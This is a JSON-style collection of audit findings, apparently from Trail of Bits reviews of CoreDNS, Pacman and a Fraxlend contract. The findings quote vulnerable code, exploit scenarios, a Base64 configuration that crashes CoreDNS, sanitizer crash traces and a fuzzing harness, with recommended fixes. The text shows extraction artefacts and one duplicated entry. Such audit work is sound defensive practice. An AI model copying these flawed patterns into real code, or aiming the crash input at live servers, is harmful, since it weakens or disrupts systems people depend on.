"https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The ioutil.ReadAll function reads from a source input until encountering an error or the end of the le, at which point it returns the data that it read. The toMsg function, which processes requests for the HTTP server, uses ioutil.ReadAll to parse requests and to read POST bodies. However, there is no limit on the size of request bodies. Using ioutil.ReadAll to parse a large request that is loaded multiple times may exhaust the systems memory, causing a DoS. func toMsg(r io.ReadCloser) (*dns.Msg, error ) { buf, err := io.ReadAll(r) if err != nil { return nil , err } m := new (dns.Msg) err = m.Unpack(buf) return m, err } Figure 14.1: plugin/pkg/doh/doh.go#L94-L102 Exploit Scenario An attacker generates multiple POST requests with long request bodies to /dns-query , leading to the exhaustion of its resources. Recommendations Short term, use the io.LimitReader function or another mechanism to limit the size of request bodies. Long term, consider implementing application-wide limits on the size of request bodies to prevent DoS attacks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Index-out-of-range panic in grpc plugin initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Initializing the grpc plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*GRPC, error ) { g := newGRPC() if !c.Args(&g.from) { return g, c.ArgErr() } g.from = plugin.Host(g.from).NormalizeExact()[ 0 ] // only the first is used. Figure 15.1: plugin/grpc/setup.go#L53-L59 An invalid conguration le for the grpc plugin could cause the call to NormalizeExtract (highlighted in gure 15.1) to return a value with zero elements. A Base64-encoded example of such a conguration le is shown below. MApncnBjIDAwMDAwMDAwMDAwhK2FhYKtMIStMITY2NnY2dnY7w== Figure 15.2: The Base64-encoded grpc conguration le Specifying a conguration le like that in gure 15.2 would cause CoreDNS to panic when attempting to access the rst element of the return value. panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/grpc.parseStanza(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:59 +0x31b github.com/coredns/coredns/plugin/grpc.parseGRPC(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:45 +0x5e github.com/coredns/coredns/plugin/grpc.setup(0x1e4dcc0) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:17 +0x30 github.com/coredns/caddy.executeDirectives(0xc0000e2900, {0x7ffc15b696e0, 0x31}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000269300, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x2239518, 0xc0002b2980}, 0xc0002b2980, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x2239518, 0xc0002b2980}, 0xc0000e2900, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x2239518, 0xc0002b2980}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 15.3: CoreDNS panics when loading the grpc conguration. Exploit Scenario An operator of a CoreDNS server miscongures the grpc plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the variable returned by NormalizeExtract has at least one element before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Use-after-free vulnerability in the print_packages function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "The print_packages function is subject to a use-after-free vulnerability. The function rst deallocates memory for the temp variable and then uses that memory in the PRINT_FORMAT_STRING macro (gure 1.1), which can lead to the following issues:  Potential exploitation of the program could occur if an attacker can allocate and control the value of the temp variable after it is freed (highlighted line 1 in gure 1.1) and before it is used in another thread (highlighted line 2 in gure 1.1). The time window for the attack is very small since the two operations happen one after another. void print_packages( const alpm_list_t *packages) { ... /* %s : size */ if (strstr(temp, \"%s\" )) { char *size; pm_asprintf(&size, \"%jd\" , ( intmax_t )pkg_get_size(pkg)); string = strreplace(temp, \"%s\" , size); free(size); free(temp); // (1) memory pointed by the temp variable is freed } /* %u : url */ PRINT_FORMAT_STRING(temp, \"%u\" , alpm_pkg_get_url) // (2) use-after-free of temp Figure 1.1: pacman/src/pacman/util.c#L12581267  A double free, if detected by the allocator, would cause a program crash. The second free is called in the PRINT_FORMAT_STRING macro. #define PRINT_FORMAT_STRING(temp, format, func) \\ if(strstr(temp, format)) { \\ string = strreplace(temp, format, func(pkg)); \\ free(temp); \\ temp = string; \\ } \\ Figure 1.2: The PRINT_FORMAT_STRING macro denition The severity of this nding has been set to low since the rst scenario should not be possible because Pacman does not use multiple threads. This issue was found with the scan-build static analyzer but can also be detected with tools such as Valgrind (gure 1.3) or AddressSanitizer (ASan). at 0x484D11D : strstr (vg_replace_strmem.c: 1792 ) by 0x12620B : print_packages (util.c: 1267 ) by 0x11F9DA : sync_prepare_execute (sync.c: 817 ) by 0x11F550 : sync_trans (sync.c: 728 ) by 0x11FF72 : pacman_sync (sync.c: 965 ) by 0x11B5EB : main (pacman.c: 1259 ) # valgrind ./pacman -S --print --print-format '%s' valgrind == 2084 == Memcheck, a memory error detector == 2084 == Copyright (C) 2002-2022 , and GNU GPL'd, by Julian Seward et al. == 2084 == Using Valgrind -3.21.0 and LibVEX; rerun with -h for copyright info == 2084 == Command: ./pacman -S --print --print-format %s valgrind == 2084 == == 2084 == Invalid read of size 1 == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == Address 0x65e61d0 is 0 bytes inside a block of size 3 free'd == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == Block was alloc'd at == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == ... ==2084== ERROR SUMMARY: 50 errors from 40 contexts (suppressed: 0 from 0) at 0x4841848 : malloc (vg_replace_malloc.c: 431 ) by 0x4A183DE : strdup (strdup.c: 42 ) by 0x125ACB : print_packages (util.c: 1198 ) by 0x11F9DA : sync_prepare_execute (sync.c: 817 ) by 0x11F550 : sync_trans (sync.c: 728 ) by 0x11FF72 : pacman_sync (sync.c: 965 ) by 0x11B5EB : main (pacman.c: 1259 ) at 0x484412F : free (vg_replace_malloc.c: 974 ) by 0x1261F2 : print_packages (util.c: 1264 ) by 0x11F9DA : sync_prepare_execute (sync.c: 817 ) by 0x11F550 : sync_trans (sync.c: 728 ) by 0x11FF72 : pacman_sync (sync.c: 965 ) by 0x11B5EB : main (pacman.c: 1259 ) Figure 1.3: Detecting the bug with Valgrind Exploit Scenario Pacman starts using multiple threads, uses the print_packages function in one thread, and performs an allocation of a similar size to the freed temp variable in another thread. An attacker with the ability to control the contents of the latter allocation exploits the program by manipulating its heap memory through the vulnerable code path. Recommendations Short term, add an assignment of temp = string; after the temp variable is freed in the vulnerable code path in the print_packages function. This will prevent the use-after-free issue. Long term, regularly scan the code with static analyzers like scan-build.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "2. Null pointer dereferences ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "The cb_progress function rst checks whether the pkgname variable is a null pointer in a ternary operator (highlighted line 1 in gure 2.1) and then may use pkgname to format a string (highlighted lines 2 and 3 in gure 2.1). This leads to a crash if pkgname is a null pointer. void cb_progress( void *ctx, alpm_progress_t event, const char *pkgname, int percent, size_t howmany, size_t current) { ... len = strlen(opr) + ((pkgname) ? strlen(pkgname) : 0 ) + 2 ; wcstr = calloc(len, sizeof ( wchar_t )); /* print our strings to the alloc'ed memory */ #if defined(HAVE_SWPRINTF) wclen = swprintf(wcstr, len, L \"%s %s\" , opr, pkgname); #else /* because the format string was simple, we can easily do this without * using swprintf, although it is probably not as safe/fast. The max * chars we can copy is decremented each time by subtracting the length * of the already printed/copied wide char string. */ // <--- (1) // <--- (2) wclen = mbstowcs(wcstr, opr, len); wclen += mbstowcs(wcstr + wclen, \" \" , len - wclen); wclen += mbstowcs(wcstr + wclen, pkgname, len - wclen); #endif // <--- (3) Figure 2.1: pacman/src/pacman/callback.c#L656660 The severity of this nding has been set to informational because if the cb_progress function were called with a null pointer, the program crash would be evident to program users and developers. An additional case of null pointer dereference is present in the _alpm_chroot_write_to_child() function if the out_cb argument is null (gure 2.2). typedef ssize_t (*_alpm_cb_io)( void *buf, ssize_t len, void *ctx); // [...] static int _alpm_chroot_write_to_child (alpm_handle_t *handle, int fd, char *buf, ssize_t *buf_size, ssize_t buf_limit, _alpm_cb_io out_cb , void *cb_ctx) { ssize_t nwrite; if (*buf_size == 0 ) { /* empty buffer, ask the callback for more */ if ((*buf_size = out_cb(buf, buf_limit, cb_ctx) ) == 0 ) { /* no more to write, close the pipe */ return -1 ; } } Figure 2.2: pacman/lib/libalpm/util.c#L469481 Recommendations Short term, modify the cb_progress and _alpm_chroot_write_to_child functions so that the above-noted pointers are checked for a null value before they are used. In the event of a null pointer, abort without dereferencing. Long term, use static analysis tools to detect cases where pointers are dereferenced without a preceding null check.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Allocation failures can lead to memory leaks or null pointer dereferences ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "There are a few code paths where allocation failures can lead to further memory leaks or null pointer dereferences:  If the strdup(path) functions allocation fails in the setdefaults function (highlighted lines 1 and 2 in gure 3.1), then the memory pointed to by the rootdir variable (highlighted line 2 in gure 3.1) would be leaked. This is because the SETDEFAULT macro would enter its error path and return -1 (highlighted line 3 in gure 3.1), not freeing the previously allocated memory. int setdefaults (config_t *c) { alpm_list_t *i; #define SETDEFAULT(opt, val) \\ if(!opt) { \\ opt = val; \\ if(!opt) { return -1; } \\ } if (c->rootdir) { char * rootdir = strdup(c->rootdir); ... char path[PATH_MAX]; if (!c->dbpath) { // (3) // (2) snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &DBPATH[ 1 ]); SETDEFAULT(c->dbpath, strdup(path)); // (1) } if (!c->logfile) { snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &LOGFILE[ 1 ]); SETDEFAULT(c->logfile, strdup(path)); // (1) } Figure 3.1: pacman/src/pacman/conf.c#L1139  1153  The alpm_list_equal_ignore_order function added in MR #96 fails to check whether the calloc function returns a non-null value (gure 3.2). If calloc returned NULL , this would lead to a null pointer dereference later in the function (line 534 of gure 3.2). 511 512 513 { 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 int SYMEXPORT alpm_list_equal_ignore_order ( const alpm_list_t *left, const alpm_list_t *right, alpm_list_fn_cmp fn) const alpm_list_t *l = left; const alpm_list_t *r = right; int *matched; if ((l == NULL ) != (r == NULL )) { return 0 ; } if (alpm_list_count(l) != alpm_list_count(r)) { return 0 ; } matched = calloc(alpm_list_count(right), sizeof ( int )); for (l = left; l; l = l->next) { int found = 0 ; int n = 0 ; for (r = right; r; r = r->next, n++) { /* make sure we don't match the same value twice */ if (matched[n]) { continue ; } Figure 3.2: MR #96: lib/libalpm/alpm_list.c#L511  536  In the _alpm_validate_filename() function, the strlen(filename) function can be called with a null pointer if the READ_AND_STORE(pkg->filename) execution fails to allocate memory through the STRDUP macro (gure 3.3). #define READ_AND_STORE(f) do { \\ READ_NEXT(); \\ STRDUP(f, line, goto error); \\ } while(0) #define STRDUP(r, s, action) do { \\ if(s != NULL) { \\ r = strdup(s); \\ if(r == NULL) { \\ _alpm_alloc_fail(strlen(s)); \\ action; \\ } } \\ else { r = NULL; } } \\ while(0) READ_AND_STORE(pkg->filename); if (_alpm_validate_filename(db, pkg->name, pkg->filename) < 0 ) { ... } Figure 3.3: pacman/lib/libalpm/be_sync.c#L591  595 The severity of this nding has been set to informational because if an allocation failed, the program would likely stop functioning properly since it would fail to allocate any more memory anyway. The rst part of this issue (pertaining to the conf.c le, rather than the alpm_list.c le) was found with the scan-build static analyzer. Recommendations Short term, to x the memory leaks and null pointer dereferences, add null-pointer checks after the allocations and before the dereferences. Long term, regularly scan the code with static analyzers like scan-build to detect missing checks of these types. 4. Bu\u0000er overow read in string_length utility function Severity: Undetermined Diculty: High Type: Data Validation Finding ID: TOB-PACMAN-4 Target: src/pacman/util.c", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Undened behavior or potential null pointer dereferences ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "There are a few code paths where a null pointer dereference or undened behavior may occur if certain conditions are met. Those issues can be detected with the scan-build static analyzer or by building and running Pacman with UndenedBehaviorSanitizer (UBSan). The scan-build results were shared along with this report. One of the code paths found by scan-build is in the lib/libalpm/remove.c le. The closedir(dir) function may be called with a null pointer when the condition that calls regcomp(...) is true (gure 5.1). This is undened behavior since the closedir function argument is marked as non-null. static void shift_pacsave (alpm_handle_t *handle, const char *file) { DIR *dir = NULL ; ... if (regcomp(&reg, regstr, REG_EXTENDED | REG_NEWLINE) != 0 ) { goto cleanup; } dir = opendir(dirname); // <-- the dir was only modified here ... cleanup : free(dirname); closedir(dir); Figure 5.1: pacman/lib/libalpm/remove.c#L349  423 Another case is in the mount_point_list function (gure 5.2). If the STRDUP macro is executed with a mnt->mnt_dir null pointer, then the strlen(mp->mount_dir) call will take a null pointer. static alpm_list_t * mount_point_list (alpm_handle_t *handle) { ... #if defined(HAVE_GETMNTENT) && defined(HAVE_MNTENT_H) ... while ((mnt = getmntent(fp))) { ALPM_ERR_MEMORY, NULL )); CALLOC(mp, 1 , sizeof (alpm_mountpoint_t), RET_ERR(handle, STRDUP(mp->mount_dir, mnt->mnt_dir, free(mp); RET_ERR(handle, ALPM_ERR_MEMORY, NULL )); mp->mount_dir_len = strlen( mp->mount_dir ); Figure 5.2: pacman/lib/libalpm/diskspace.c#L95  116 In addition, gure 5.3 shows a run of Pacman with UBSan that detects other cases of this issue. # CFLAGS=-fsanitize=address,undefined LDFLAGS=-fsanitize=address,undefined meson setup sanitize # cd sanitize # CFLAGS=-fsanitize=address,undefined LDFLAGS=-fsanitize=address,undefined meson compile # ./pacman -Syuu :: Synchronizing package databases... core downloading... extra downloading... :: Starting full system upgrade... ../lib/libalpm/util.c:1149:9: runtime error: null pointer passed as argument 1, which is declared to never be null ../lib/libalpm/util.c:1151:10: runtime error: null pointer passed as argument 1, which is declared to never be null ../lib/libalpm/util.c:1192:4: runtime error: null pointer passed as argument 2, which is declared to never be null ... :: Proceed with installation? [Y/n] Y ... Figure 5.3: Running Pacman with UBSan Recommendations Short term, x the cases where functions marked with non-null arguments are called with null pointers by putting the function calls inside if statements that perform null checks. Long term, regularly test Pacman with UBSan and scan its codebase with static analyzers such as scan-build.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "6. Undened behavior from use of atoi ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "The atoi function is used to convert strings to integers when parsing local database les and command-line arguments (gures 6.1 and 6.2). The behavior of atoi is undened in the case where the input string is not a valid formatted number or in the case of an overow. The severity of this nding has been set to informational because, in practice, atoi will typically return a dummy value, such as 0 or -1 , in the case of an incorrect input or an overow. } else if (strcmp(line, \"%REASON%\" ) == 0 ) { READ_NEXT(); info->reason = (alpm_pkgreason_t) atoi(line) ; Figure 6.1: Use of atoi ( lib/libalpm/be_local.c#L774  776 ) case OP_ASK : config->noask = 1 ; config->ask = ( unsigned int ) atoi(optarg) ; break ; ... case OP_DEBUG : /* debug levels are made more 'human readable' than using a raw logmask * here, error and warning are set in config_new, though perhaps a * --quiet option will remove these later */ if (optarg) { unsigned short debug = ( unsigned short ) atoi(optarg) ; switch (debug) { case 2 : config->logmask |= ALPM_LOG_FUNCTION; __attribute__((fallthrough)); case 1 : config->logmask |= ALPM_LOG_DEBUG; break ; default : pm_printf(ALPM_LOG_ERROR, _( \"'%s' is not a valid debug optarg); level\\n\" ), } } else { return 1 ; config->logmask |= ALPM_LOG_DEBUG; } /* progress bars get wonky with debug on, shut them off */ config->noprogressbar = 1 ; break ; Figure 6.2: Uses of atoi ( src/pacman/pacman.c#L382  430 ) Recommendations Short term, use the strtol function instead of atoi . After calling strtol , check the errno value for a failed conversion. Make sure to perform bounds checking when casting the long value returned by strtol down to an int .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Database parsers fail silently if an option is not recognized ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "The sync_db_read and local_db_read functions, which are responsible for parsing sync database les and local database les respectively, fail silently if an option is not recognized. This can cause a conguration option to not be set, which may cause issues if, for example, the local installation of Pacman is out of date and does not support newly added conguration options. Exploit Scenario Support for SHA-3 hash verication is added, along with a corresponding conguration option, %SHA3SUM% . Older installations of Pacman, which do not support this conguration option, will ignore it. This causes package hashes to not be veried. Recommendations Short term, add default behavior in the sync_db_read and local_db_read functions for when a conguration option is not recognized. Unrecognized options should cause a log message or an error.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Cache cleaning function may delete the wrong les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "In the sync_cleancache function, a path is constructed for deletion using the snprintf function. A maximum path length of PATH_MAX is given (on Linux, this value is 4096 characters). However, there is no check to ensure that the path created by snprintf was not cut short by the limit. This can lead to deletion of a dierent path than intended. The severity of this nding has been set to informational because it is highly unlikely that Pacman would use a path this long in practice. /* build the full filepath */ snprintf(path, PATH_MAX, \"%s%s\" , cachedir, ent->d_name); /* short circuit for removing all files from cache */ if (level > 1 ) { ret += unlink_verbose(path, 0 ); continue ; } Figure 8.1: Path creation and le deletion ( pacman/src/pacman/sync.c#L241  248 ) Recommendations Short term, add a check that compares the value returned by snprintf and ensures that it is less than PATH_MAX .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Integer underow in a length check leads to out-of-bounds read in alpm_extract_keyid ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "The alpm_extract_keyid function (gure 9.1) contains an out-of-bounds read issue due to an integer underow in the length_check function when a specically crafted input is provided (gure 9.2). int SYMEXPORT alpm_extract_keyid (alpm_handle_t *handle, const char *identifier, const unsigned char *sig, const size_t len, alpm_list_t **keys) { size_t pos, blen, hlen, ulen; pos = 0 ; while (pos < len) { if (!(sig[pos] & 0x80 )) { ... - return signature format error } if (sig[pos] & 0x40 ) { /* new packet format */ if (length_check(len, pos, 1 , handle, identifier) != 0 ) { return -1 ; } pos = pos + 1 ; Figure 9.1: pacman/lib/libalpm/signing.c#L1101  1223 /* Check to avoid out of boundary reads */ static size_t length_check ( size_t length, size_t position, size_t a, alpm_handle_t *handle, const char *identifier) { if ( a == 0 || length - position <= a ) { _alpm_log(handle, ALPM_LOG_ERROR, _( \"%s: signature format error\\n\" ), identifier); return -1 ; } else { return 0 ; } } Figure 9.2: pacman/lib/libalpm/signing.c#L1043  The length_check function is used to conrm whether advancing a position ( pos ) index is safe. It is used by alpm_extract_keyid , for example, in the following way: length_check(len, pos, 2, handle, identifier) The len variable is the length of the signature buer ( sig ), and pos is an index in that buer. However, the pos index can be bigger than the len variable, and when that happens, the length-position computation in the length_check function underows and the function returns 0 , leading to the out-of-bounds read. We found this issue by fuzzing the alpm_extract_keyid function. The fuzzing harness code is included in appendix D . Recommendations Short term, x the integer underow issue in the length_check function by changing the highlighted if statement in gure 9.2 to the following: if ( a == 0 || (position <= length && length - position <= a) ) This will prevent out-of-bounds reads in the alpm_extract_keyid function. Long term, fuzz the Pacman functions, as shown in appendix D , for example. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "3. Allocation failures can lead to memory leaks or null pointer dereferences ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "There are a few code paths where allocation failures can lead to further memory leaks or null pointer dereferences:  If the strdup(path) functions allocation fails in the setdefaults function (highlighted lines 1 and 2 in gure 3.1), then the memory pointed to by the rootdir variable (highlighted line 2 in gure 3.1) would be leaked. This is because the SETDEFAULT macro would enter its error path and return -1 (highlighted line 3 in gure 3.1), not freeing the previously allocated memory. int setdefaults (config_t *c) { alpm_list_t *i; #define SETDEFAULT(opt, val) \\ if(!opt) { \\ opt = val; \\ if(!opt) { return -1; } \\ } if (c->rootdir) { char * rootdir = strdup(c->rootdir); ... char path[PATH_MAX]; if (!c->dbpath) { // (3) // (2) snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &DBPATH[ 1 ]); SETDEFAULT(c->dbpath, strdup(path)); // (1) } if (!c->logfile) { snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &LOGFILE[ 1 ]); SETDEFAULT(c->logfile, strdup(path)); // (1) } Figure 3.1: pacman/src/pacman/conf.c#L1139  1153  The alpm_list_equal_ignore_order function added in MR #96 fails to check whether the calloc function returns a non-null value (gure 3.2). If calloc returned NULL , this would lead to a null pointer dereference later in the function (line 534 of gure 3.2). 511 512 513 { 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 int SYMEXPORT alpm_list_equal_ignore_order ( const alpm_list_t *left, const alpm_list_t *right, alpm_list_fn_cmp fn) const alpm_list_t *l = left; const alpm_list_t *r = right; int *matched; if ((l == NULL ) != (r == NULL )) { return 0 ; } if (alpm_list_count(l) != alpm_list_count(r)) { return 0 ; } matched = calloc(alpm_list_count(right), sizeof ( int )); for (l = left; l; l = l->next) { int found = 0 ; int n = 0 ; for (r = right; r; r = r->next, n++) { /* make sure we don't match the same value twice */ if (matched[n]) { continue ; } Figure 3.2: MR #96: lib/libalpm/alpm_list.c#L511  536  In the _alpm_validate_filename() function, the strlen(filename) function can be called with a null pointer if the READ_AND_STORE(pkg->filename) execution fails to allocate memory through the STRDUP macro (gure 3.3). #define READ_AND_STORE(f) do { \\ READ_NEXT(); \\ STRDUP(f, line, goto error); \\ } while(0) #define STRDUP(r, s, action) do { \\ if(s != NULL) { \\ r = strdup(s); \\ if(r == NULL) { \\ _alpm_alloc_fail(strlen(s)); \\ action; \\ } } \\ else { r = NULL; } } \\ while(0) READ_AND_STORE(pkg->filename); if (_alpm_validate_filename(db, pkg->name, pkg->filename) < 0 ) { ... } Figure 3.3: pacman/lib/libalpm/be_sync.c#L591  595 The severity of this nding has been set to informational because if an allocation failed, the program would likely stop functioning properly since it would fail to allocate any more memory anyway. The rst part of this issue (pertaining to the conf.c le, rather than the alpm_list.c le) was found with the scan-build static analyzer. Recommendations Short term, to x the memory leaks and null pointer dereferences, add null-pointer checks after the allocations and before the dereferences. Long term, regularly scan the code with static analyzers like scan-build to detect missing checks of these types.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Bu\u0000er overow read in string_length utility function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf", "body": "The string_length utility function (gure 4.1) skips ANSI color codes when computing the length. When a string includes the \\033 byte that starts the ANSI color code sequence but does not have the m character that ends it, the function will read memory past the end of the string, causing a buer overow read. This can lead to a program crash or other issues, depending on how the function is used. static size_t string_length ( const char *s) { int len; wchar_t *wcstr; if (!s || s[ 0 ] == '\\0' ) { return 0 ; } if (strstr(s, \"\\033\" )) { char * replaced = malloc( sizeof ( char ) * strlen(s)); int iter = 0 ; for (; *s; s++) { if (*s == '\\033' ) { while (*s != 'm' ) { s++; } } else { replaced[iter] = *s; iter++; } } replaced[iter] = '\\0' ; Figure 4.1: pacman/src/pacman/util.c#L452  473 Recommendations Short term, so that the loop terminates at a null character, change the conditional within the while() statement in the string_length function to the following: while (*s && *s != 'm' ) Long term, implement a fuzzing harness for the string_length function to ensure it does not contain any bugs. An example harness code can be found in gure 4.2; this can be compiled and run using the following commands: clang -fsanitize=fuzzer,address main.c -ggdb -o fuzzer ./fuzzer #define _XOPEN_SOURCE #include <stdio.h> #include <stdlib.h> #include <stdint.h> #include <string.h> #include <wchar.h> static size_t string_length( const char *s) { ... } int LLVMFuzzerTestOneInput ( const uint8_t *Data, size_t Size) { if (Size == 0 ) return 0 ; // Prepare a null terminated string char * x = malloc(Size+ 1 ); memcpy(x, Data, Size); x[Size] = 0 ; string_length(x); free(x); return 0 ; } Figure 4.2: Example fuzzing harness that uses libFuzzer to test the string_length function Figure 4.3 shows an example output of such a fuzzer. We also implemented this harness as part of the Pacman codebase, as detailed in appendix D . $ clang -fsanitize=fuzzer,address main.c -ggdb -o fuzzer $ ./fuzzer INFO: Running with entropic power schedule (0xFF, 100). INFO: Seed: 1790240281 INFO: Loaded 1 modules (12 inline 8-bit counters): 12 [0x56046acc5fc0, 0x56046acc5fcc), INFO: Loaded 1 PC tables (12 PCs): 12 [0x56046acc5fd0,0x56046acc6090), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus #2 ... #173 REDUCE cov: 5 ft: 6 corp: 2/2b lim: 4 exec/s: 0 rss: 31Mb L: 1/1 MS: 1 ================================================================= INITED cov: 4 ft: 5 corp: 1/1b exec/s: 0 rss: 30Mb ==2873139==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000006b53 at pc 0x56046ac84a76 bp 0x7ffd09e07ef0 sp 0x7ffd09e07ee8 READ of size 1 at 0x602000006b53 thread T0 #0 0x56046ac84a75 in string_length /fuzz/main.c:21:11 #1 0x56046ac8483d in LLVMFuzzerTestOneInput /fuzz/main.c:56:2 #2 0x56046abad383 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/fuzz/fuzzer+0x3e383) (BuildId: 65f386451dc943b740358c52379831570eef52be)  0x602000006b53 is located 0 bytes to the right of 3-byte region [0x602000006b50,0x602000006b53) allocated by thread T0 here: #0 0x56046ac499fe in malloc (/fuzz/fuzzer+0xda9fe) (BuildId: 65f386451dc943b740358c52379831570eef52be) #1 0x56046ac847db in LLVMFuzzerTestOneInput /root/fuz/main.c:53:12 ... SUMMARY: AddressSanitizer: heap-buffer-overflow /root/fuz/main.c:21:11 in string_length ... Figure 4.3: Output from the fuzzer from gure 4.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "1. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The owner of a contract that inherits from the FraxlendPairCore contract can be changed through a call to the transferOwnership function. This function internally calls the _setOwner function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _setOwner(newOwner); } function _setOwner ( address newOwner ) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 1.1: OpenZeppelins OwnableUpgradeable contract Exploit Scenario Alice, a Frax Finance administrator, invokes the transferOwnership function to change the address of an existing contracts owner but mistakenly submits the wrong address. As a result, ownership of the contract is permanently lost. Recommendations Short term, implement ownership transfer operations that are executed in a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Missing checks of constructor/initialization parameters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "In the Fraxlend protocols constructor function, various settings are congured; however, two of the conguration parameters do not have checks to validate the values that they are set to. First, the _liquidationFee parameter does not have an upper limit check: constructor ( bytes memory _configData, bytes memory _immutables, uint256 _maxLTV , uint256 _liquidationFee , uint256 _maturityDate , uint256 _penaltyRate , bool _isBorrowerWhitelistActive , bool _isLenderWhitelistActive ) { [...] cleanLiquidationFee = _liquidationFee; dirtyLiquidationFee = (_liquidationFee * 90000 ) / LIQ_PRECISION; // 90 % of clean fee Figure 2.1: The constructor functions parameters in FraxlendPairCore.sol#L193-L194 Second, the Fraxlend system can work with one or two oracles; however, there is no check to ensure that at least one oracle is set: constructor ( bytes memory _configData, bytes memory _immutables, uint256 _maxLTV , uint256 _liquidationFee , uint256 _maturityDate , uint256 _penaltyRate , bool _isBorrowerWhitelistActive , bool _isLenderWhitelistActive ) { // [...] // Oracle Settings { IFraxlendWhitelist _fraxlendWhitelist = IFraxlendWhitelist(FRAXLEND_WHITELIST_ADDRESS); // Check that oracles are on the whitelist if (_oracleMultiply != address ( 0 ) && !_fraxlendWhitelist.oracleContractWhitelist(_oracleMultiply)) { revert NotOnWhitelist(_oracleMultiply); } if (_oracleDivide != address ( 0 ) && !_fraxlendWhitelist.oracleContractWhitelist(_oracleDivide)) { revert NotOnWhitelist(_oracleDivide); } 